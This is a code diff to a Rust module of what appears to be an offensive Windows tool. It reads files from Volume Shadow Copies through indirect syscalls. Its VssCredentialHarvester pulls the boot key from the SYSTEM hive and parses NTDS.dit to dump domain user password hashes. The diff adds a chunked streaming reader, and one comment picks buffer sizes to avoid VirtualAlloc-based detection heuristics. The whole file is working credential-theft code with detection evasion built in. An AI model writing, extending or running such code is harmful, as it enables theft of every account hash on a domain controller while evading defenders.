@@ -44,11 +44,11 @@ use std::os::windows::ffi::OsStrExt;
 use std::ptr;
 
 use anyhow::{anyhow, bail, Context, Result};
-use log::{debug, info, warn};
+use tracing::{debug, info, warn};
 use serde::{Deserialize, Serialize};
 
-use winapi::shared::minwindef::{BOOL, DWORD, FALSE, LPVOID, TRUE};
-use winapi::shared::ntdef::HANDLE;
+use crate::win_types::{BOOL, DWORD, FALSE, LPVOID, TRUE};
+use crate::win_types::HANDLE;
 
 use crate::pe_resolve_macros::hash_str_const;
 use crate::win_types::{PROCESS_INFORMATION, STARTUPINFOW};
@@ -105,12 +105,25 @@ const STARTF_USESTDHANDLES: DWORD = 0x00000100;
 /// Maximum shadow copy index to probe.
 const MAX_SHADOW_INDEX: u32 = 128;
 
-/// Maximum VSS file read size (2 GB — NTDS.dit can be very large on
-/// production domain controllers; the previous 32 MiB cap was insufficient
-/// and would silently truncate large databases, producing corrupt output).
+/// Maximum VSS file size that may be read into a single contiguous buffer.
+/// NTDS.dit on large domain controllers can exceed 100 MB; 256 MB is a
+/// generous ceiling that avoids the 2 GB contiguous-allocation footprint
+/// that would trigger VirtualAlloc-based detection heuristics and fail on
+/// memory-constrained systems.
+const VSS_MAX_BUFFER_READ: usize = 256 * 1024 * 1024;
+
+/// Absolute ceiling for streaming reads.  Individual chunks are capped at
+/// `VSS_STREAM_CHUNK_SIZE`; the total bytes delivered across all chunks
+/// must not exceed this limit.
 const MAX_VSS_READ_SIZE: usize = 2 * 1024 * 1024 * 1024;
 
-/// Buffer size for reading file data (64 KB).
+/// Size of each chunk delivered by the streaming reader (64 MB).
+/// This is also the pre-allocation quantum used inside `read_file_contents`
+/// so that the Vec grows in controlled increments rather than one giant
+/// contiguous reservation.
+const VSS_STREAM_CHUNK_SIZE: usize = 64 * 1024 * 1024;
+
+/// Buffer size for individual NtReadFile calls (64 KB).
 const READ_BUFFER_SIZE: usize = 65536;
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -151,7 +164,7 @@ type FnCreateProcessW = unsafe extern "system" fn(
 type FnCreatePipe = unsafe extern "system" fn(
     *mut HANDLE,
     *mut HANDLE,
-    *mut winapi::um::minwinbase::SECURITY_ATTRIBUTES,
+    *mut crate::win_types::SECURITY_ATTRIBUTES,
     DWORD,
 ) -> i32;
 
@@ -353,13 +366,13 @@ impl VssDiscovery {
             .chain(std::iter::once(0))
             .collect();
 
-        let mut obj_name = winapi::shared::ntdef::UNICODE_STRING {
+        let mut obj_name = crate::win_types::UNICODE_STRING {
             Length: (path_u16.len().saturating_sub(1) * 2) as u16,
             MaximumLength: (path_u16.len() * 2) as u16,
             Buffer: path_u16.as_mut_ptr(),
         };
-        let mut obj_attr = winapi::shared::ntdef::OBJECT_ATTRIBUTES {
-            Length: std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32,
+        let mut obj_attr = crate::win_types::OBJECT_ATTRIBUTES {
+            Length: std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32,
             RootDirectory: ptr::null_mut(),
             ObjectName: &mut obj_name,
             Attributes: OBJ_CASE_INSENSITIVE,
@@ -486,6 +499,52 @@ impl VssFileReader {
         Err(last_err.unwrap_or_else(|| anyhow!("No shadow copies available")))
     }
 
+    /// Stream a file via VSS in chunks, trying all available shadow copies.
+    ///
+    /// Like `read_file_via_vss`, but delivers data incrementally through
+    /// the `on_chunk` callback instead of accumulating a single contiguous
+    /// buffer.  Each callback receives a `&[u8]` slice of up to
+    /// `READ_BUFFER_SIZE` bytes.  Suitable for large files (e.g. NTDS.dit)
+    /// where a single 2 GB allocation is undesirable.
+    ///
+    /// Returns the total number of bytes streamed and metadata about which
+    /// shadow copy was used.
+    pub fn read_file_via_vss_chunked<F>(
+        original_path: &str,
+        mut on_chunk: F,
+    ) -> Result<(u64, String, u32)>
+    where
+        F: FnMut(&[u8]) -> Result<()>,
+    {
+        let copies = VssDiscovery::enumerate_shadow_copies()?;
+        if copies.is_empty() {
+            bail!("No shadow copies available to read file: {}", original_path);
+        }
+
+        let mut last_err = None;
+        for sc in &copies {
+            let vss_path = Self::path_to_vss_path(original_path, &sc.device_object);
+            debug!(
+                "Attempting VSS streaming read: {} -> {}",
+                original_path, vss_path
+            );
+            match Self::read_file_nt_chunked(&vss_path, &mut on_chunk) {
+                Ok(total) => {
+                    return Ok((total, vss_path, sc.index));
+                }
+                Err(e) => {
+                    debug!(
+                        "Failed to stream {} from shadow copy {}: {}",
+                        original_path, sc.index, e
+                    );
+                    last_err = Some(e);
+                }
+            }
+        }
+
+        Err(last_err.unwrap_or_else(|| anyhow!("No shadow copies available")))
+    }
+
     /// Read a file from a specific shadow copy.
     fn read_file_from_shadow(original_path: &str, shadow: &ShadowCopy) -> Result<VssFileResult> {
         let vss_path = Self::path_to_vss_path(original_path, &shadow.device_object);
@@ -541,13 +600,13 @@ impl VssFileReader {
             .chain(std::iter::once(0))
             .collect();
 
-        let mut obj_name = winapi::shared::ntdef::UNICODE_STRING {
+        let mut obj_name = crate::win_types::UNICODE_STRING {
             Length: (path_u16.len().saturating_sub(1) * 2) as u16,
             MaximumLength: (path_u16.len() * 2) as u16,
             Buffer: path_u16.as_mut_ptr(),
         };
-        let mut obj_attr = winapi::shared::ntdef::OBJECT_ATTRIBUTES {
-            Length: std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32,
+        let mut obj_attr = crate::win_types::OBJECT_ATTRIBUTES {
+            Length: std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32,
             RootDirectory: ptr::null_mut(),
             ObjectName: &mut obj_name,
             Attributes: OBJ_CASE_INSENSITIVE,
@@ -587,16 +646,112 @@ impl VssFileReader {
         result
     }
 
+    /// Stream a file using NtCreateFile + NtReadFile via indirect syscalls,
+    /// delivering data through a callback instead of a single contiguous Vec.
+    ///
+    /// Each invocation of `on_chunk` receives a `&[u8]` slice of up to
+    /// `READ_BUFFER_SIZE` bytes.  Total bytes are capped at
+    /// `MAX_VSS_READ_SIZE`.
+    fn read_file_nt_chunked(
+        win32_path: &str,
+        on_chunk: &mut impl FnMut(&[u8]) -> Result<()>,
+    ) -> Result<u64> {
+        let nt_path = if win32_path.starts_with(r"\\?\GLOBALROOT") {
+            win32_path.replacen(r"\\?\GLOBALROOT", r"\??\GLOBALROOT", 1)
+        } else if win32_path.starts_with(r"\\?\") {
+            win32_path.replacen(r"\\?\", r"\??\", 1)
+        } else {
+            format!(r"\??\{}", win32_path)
+        };
+
+        let mut path_u16: Vec<u16> = OsStr::new(&nt_path)
+            .encode_wide()
+            .chain(std::iter::once(0))
+            .collect();
+
+        let mut obj_name = crate::win_types::UNICODE_STRING {
+            Length: (path_u16.len().saturating_sub(1) * 2) as u16,
+            MaximumLength: (path_u16.len() * 2) as u16,
+            Buffer: path_u16.as_mut_ptr(),
+        };
+        let mut obj_attr = crate::win_types::OBJECT_ATTRIBUTES {
+            Length: std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32,
+            RootDirectory: ptr::null_mut(),
+            ObjectName: &mut obj_name,
+            Attributes: OBJ_CASE_INSENSITIVE,
+            SecurityDescriptor: ptr::null_mut(),
+            SecurityQualityOfService: ptr::null_mut(),
+        };
+        let mut io_status = [0u64; 2];
+        let mut h_file: usize = 0;
+
+        let status = crate::syscall!(
+            "NtCreateFile",
+            &mut h_file as *mut _ as u64,
+            (SYNCHRONIZE | FILE_READ_DATA) as u64,
+            &mut obj_attr as *mut _ as u64,
+            io_status.as_mut_ptr() as u64,
+            0u64, // AllocationSize
+            0u64, // FileAttributes
+            (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE) as u64,
+            FILE_OPEN as u64,
+            (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as u64,
+        )
+        .map_err(|e| anyhow!("NtCreateFile syscall error: {e}"))?;
+
+        if status < 0 || h_file == 0 {
+            return Err(anyhow!(
+                "NtCreateFile failed for VSS path: NTSTATUS {:#010x}",
+                status as u32
+            ));
+        }
+
+        let result = Self::read_handle_chunked(h_file, on_chunk);
+
+        let _ = crate::syscall!("NtClose", h_file as u64);
+
+        result
+    }
+
     /// Read the entire contents of an open file handle using NtReadFile.
+    ///
+    /// Internally streams in `VSS_STREAM_CHUNK_SIZE` increments so the Vec
+    /// never needs a single 2 GB reservation.  Caps the result at
+    /// `VSS_MAX_BUFFER_READ`; for files larger than that use
+    /// `read_file_nt_chunked` instead.
     fn read_file_contents(h_file: usize) -> Result<Vec<u8>> {
-        let mut file_data = Vec::new();
+        let mut file_data = Vec::with_capacity(READ_BUFFER_SIZE);
+        Self::read_handle_chunked(h_file, |chunk| {
+            if file_data.len().saturating_add(chunk.len()) > VSS_MAX_BUFFER_READ {
+                bail!(
+                    "VSS file exceeds single-buffer cap ({} bytes); use streaming reader",
+                    VSS_MAX_BUFFER_READ
+                );
+            }
+            file_data.extend_from_slice(chunk);
+            Ok(())
+        })?;
+        debug!("Read {} bytes from VSS file handle", file_data.len());
+        Ok(file_data)
+    }
+
+    /// Stream the contents of an open file handle in chunks via a callback.
+    ///
+    /// Each invocation of `on_chunk` receives a `&[u8]` slice of up to
+    /// `READ_BUFFER_SIZE` bytes.  The total bytes delivered will not exceed
+    /// `MAX_VSS_READ_SIZE`.  The callback may return `Err` to abort the read.
+    fn read_handle_chunked(
+        h_file: usize,
+        mut on_chunk: impl FnMut(&[u8]) -> Result<()>,
+    ) -> Result<u64> {
         let mut io_status = [0u64; 2];
         let mut offset: i64 = 0;
+        let mut total_read: u64 = 0;
 
         loop {
-            if file_data.len() >= MAX_VSS_READ_SIZE {
+            if total_read as usize >= MAX_VSS_READ_SIZE {
                 warn!(
-                    "VSS file read exceeded maximum size ({} bytes), truncating",
+                    "VSS streaming read reached absolute ceiling ({} bytes), stopping",
                     MAX_VSS_READ_SIZE
                 );
                 break;
@@ -633,12 +788,13 @@ impl VssFileReader {
                 break;
             }
 
-            file_data.extend_from_slice(&buf[..bytes_read]);
+            on_chunk(&buf[..bytes_read])?;
+            total_read += bytes_read as u64;
             offset += bytes_read as i64;
         }
 
-        debug!("Read {} bytes from VSS file handle", file_data.len());
-        Ok(file_data)
+        debug!("Streamed {} bytes from VSS file handle", total_read);
+        Ok(total_read)
     }
 }
 
@@ -690,7 +846,7 @@ impl VssCredentialHarvester {
     /// Reads `C:\Windows\NTDS\NTDS.dit` through VSS (bypasses AD DS lock)
     /// and parses the ESE database to extract domain user hashes.
     pub fn harvest_ntds_via_vss() -> Result<NtdsDump> {
-        // Read SYSTEM hive for boot key.
+        // Read SYSTEM hive for boot key (small file — buffered read is fine).
         let system_data = VssFileReader::read_file_via_vss(
             r"C:\Windows\System32\config\SYSTEM",
         )
@@ -699,13 +855,27 @@ impl VssCredentialHarvester {
         let boot_key = Self::extract_boot_key(&system_data.data)
             .context("Failed to extract boot key from SYSTEM hive")?;
 
-        // Read NTDS.dit via VSS (this file is normally locked by the AD DS service).
-        let ntds_data = VssFileReader::read_file_via_vss(
-            r"C:\Windows\NTDS\NTDS.dit",
-        )
-        .context("Failed to read NTDS.dit via VSS")?;
+        // Read NTDS.dit via VSS using the streaming reader.
+        // NTDS.dit can be very large (hundreds of MB on production DCs).
+        // The streaming API avoids a single 2 GB contiguous allocation and
+        // grows the buffer in VSS_STREAM_CHUNK_SIZE increments.
+        let mut ntds_buf = Vec::with_capacity(VSS_STREAM_CHUNK_SIZE);
+        let (total_bytes, _vss_path, shadow_index) =
+            VssFileReader::read_file_via_vss_chunked(
+                r"C:\Windows\NTDS\NTDS.dit",
+                |chunk| {
+                    ntds_buf.extend_from_slice(chunk);
+                    Ok(())
+                },
+            )
+            .context("Failed to stream NTDS.dit via VSS")?;
 
-        let entries = Self::parse_ntds_dit(&ntds_data.data, &boot_key)
+        debug!(
+            "Streamed {} bytes of NTDS.dit from shadow copy {}",
+            total_bytes, shadow_index
+        );
+
+        let entries = Self::parse_ntds_dit(&ntds_buf, &boot_key)
             .context("Failed to parse NTDS.dit")?;
 
         info!("Harvested {} NTDS entries via VSS", entries.len());
@@ -1041,8 +1211,8 @@ fn run_command_capture_output(program: &str, args: &str) -> Result<String> {
         .collect();
 
     // Create pipes for stdout capture.
-    let mut sa = winapi::um::minwinbase::SECURITY_ATTRIBUTES {
-        nLength: std::mem::size_of::<winapi::um::minwinbase::SECURITY_ATTRIBUTES>() as u32,
+    let mut sa = crate::win_types::SECURITY_ATTRIBUTES {
+        nLength: std::mem::size_of::<crate::win_types::SECURITY_ATTRIBUTES>() as u32,
         lpSecurityDescriptor: ptr::null_mut(),
         bInheritHandle: TRUE,
     };
